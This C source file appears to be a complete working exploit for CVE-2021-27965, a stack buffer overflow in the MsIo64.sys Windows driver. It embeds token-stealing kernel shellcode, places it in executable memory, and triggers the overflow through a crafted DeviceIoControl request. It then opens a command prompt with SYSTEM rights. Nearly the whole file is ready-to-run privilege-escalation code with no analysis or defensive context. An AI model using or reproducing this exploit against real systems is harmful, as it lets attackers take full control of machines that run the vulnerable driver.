#include "exploit.h"

unsigned char payload[] =
{
	0x65, 0x48, 0x8B, 0x04, 0x25, 0x88, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x40, 0x70, 0x48, 0x89, 0xC3, 0x48, 0x8B, 0x9B, 0x88, 0x01, 0x00, 0x00, 0x48, 0x81, 0xEB, 0x88, 0x01, 0x00, 0x00, 0x48, 0x8B,
	0x8B, 0x80, 0x01, 0x00, 0x00, 0x48, 0x83, 0xF9, 0x04, 0x75, 0xE5, 0x48, 0x8B, 0x8B, 0x08, 0x02, 0x00, 0x00, 0x80, 0xE1, 0xF0, 0x48, 0x89, 0x88, 0x08, 0x02, 0x00, 0x00, 0x48, 0x83, 0xC4, 0x38,
	0xC3
};

int main(int argc, char** argv)
{
	INPUT_BUFFER input;
	HANDLE h_driver = CreateFileA(DEVICE, GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
	unsigned long bytes_returned = 0;
	unsigned char unused = 0, output[2048], * payload_allocation = 0;

	RtlSecureZeroMemory(&input, sizeof(input));
	RtlSecureZeroMemory(&output, sizeof(output));

	SetConsoleTitleA("CVE-2021-27965");

	printf("[*] MsIo64.sys Kernel Stack-based Buffer Overflow Local Privilege Escalation\n[*] Tested successfully on Windows 7 SP1 Build 7601 64-bit\n[*] Exploit written by ExAllocatePool2\n[!] Let's exploit!");

	if (h_driver == (HANDLE)-1)
	{
		printf("\n[-] Failed to obtain a handle to the device driver. Error: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("\n[+] Obtained a handle to the device driver. Handle Value: 0x%p", h_driver);

	payload_allocation = VirtualAlloc(0, sizeof(payload), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!payload_allocation)
	{
		printf("\n[-] Failed to allocate executable stack memory for the kernel payload. Error: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("\n[+] Allocated executable stack memory for the kernel payload. Payload Address: 0x%p", payload_allocation);

	memcpy(payload_allocation, &payload, sizeof(payload));
	printf("\n[+] Mapped the kernel payload onto the executable stack allocation.");

	memset(&input.Padding, 0x41, sizeof(input.Padding));
	input.PayloadAddress = payload_allocation;
	printf("\n[+] Crafted special input structure.\n<---------------- | Entering Danger Zone | ---------------->\n[!] Triggering kernel stack-based buffer overflow in 3...");
	Sleep(1000);
	for (int i = 2; i > 0; i--)
	{
		printf("\n[!] %d...", i);
		Sleep(1000);
	}

	if (!DeviceIoControl(h_driver, IOCTL_MSIO_READPORT, &input, sizeof(input), &output, sizeof(output), &bytes_returned, 0))
	{
		printf("\n[-] Failed to send a specially crafted request to the device driver. Error: %d (0x%x)\n<---------------- | Leaving Danger Zone | ---------------->", GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("\n[+] Successfully exploited a kernel stack-based buffer overflow!\n<---------------- | Leaving Danger Zone | ---------------->\n[+] Exploit completed.");

	system("start C:\\Windows\\System32\\cmd.exe");
	unused = getchar();
	return 0;
}